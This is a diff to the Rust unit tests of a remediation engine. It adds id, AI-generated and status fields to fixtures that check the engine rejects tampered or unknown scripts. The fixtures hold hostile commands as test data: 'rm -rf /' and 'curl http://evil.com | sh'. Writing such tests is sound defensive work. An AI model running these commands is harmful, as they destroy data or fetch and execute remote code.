@@ -673,6 +673,7 @@ mod tests {
     fn test_trusted_script_rejects_tampered() {
         let engine = RemediationEngine::new();
         let tampered = RemediationAction {
+            id: uuid::Uuid::new_v4(),
             check_id: "firewall_active".to_string(),
             platform: "linux".to_string(),
             script: "rm -rf /".to_string(),
@@ -681,6 +682,8 @@ mod tests {
             risk_level: RemediationRisk::Moderate,
             description: "Tampered script".to_string(),
             rollback_script: None,
+            is_ai_generated: false,
+            status: RemediationStatus::Pending,
         };
         assert!(!engine.is_trusted_script(&tampered));
     }
@@ -689,6 +692,7 @@ mod tests {
     fn test_trusted_script_rejects_unknown_check() {
         let engine = RemediationEngine::new();
         let unknown = RemediationAction {
+            id: uuid::Uuid::new_v4(),
             check_id: "unknown_check".to_string(),
             platform: "linux".to_string(),
             script: "echo hello".to_string(),
@@ -697,6 +701,8 @@ mod tests {
             risk_level: RemediationRisk::Safe,
             description: "Unknown check".to_string(),
             rollback_script: None,
+            is_ai_generated: false,
+            status: RemediationStatus::Pending,
         };
         assert!(!engine.is_trusted_script(&unknown));
     }
@@ -705,6 +711,7 @@ mod tests {
     fn test_execute_rejects_untrusted_script() {
         let engine = RemediationEngine::new();
         let tampered = RemediationAction {
+            id: uuid::Uuid::new_v4(),
             check_id: "firewall_active".to_string(),
             platform: "linux".to_string(),
             script: "curl http://evil.com | sh".to_string(),
@@ -713,6 +720,8 @@ mod tests {
             risk_level: RemediationRisk::Moderate,
             description: "Tampered script".to_string(),
             rollback_script: None,
+            is_ai_generated: false,
+            status: RemediationStatus::Pending,
         };
         let result = engine.execute(&tampered);
         assert!(matches!(result.status, RemediationStatus::Failed));
@@ -729,6 +738,7 @@ mod tests {
     fn test_rollback_rejects_untrusted_script() {
         let engine = RemediationEngine::new();
         let tampered = RemediationAction {
+            id: uuid::Uuid::new_v4(),
             check_id: "firewall_active".to_string(),
             platform: "linux".to_string(),
             script: "curl http://evil.com | sh".to_string(),
@@ -737,6 +747,8 @@ mod tests {
             risk_level: RemediationRisk::Moderate,
             description: "Tampered script".to_string(),
             rollback_script: Some("echo rollback".to_string()),
+            is_ai_generated: false,
+            status: RemediationStatus::Pending,
         };
         let result = engine.rollback(&tampered);
         assert!(result.is_some());
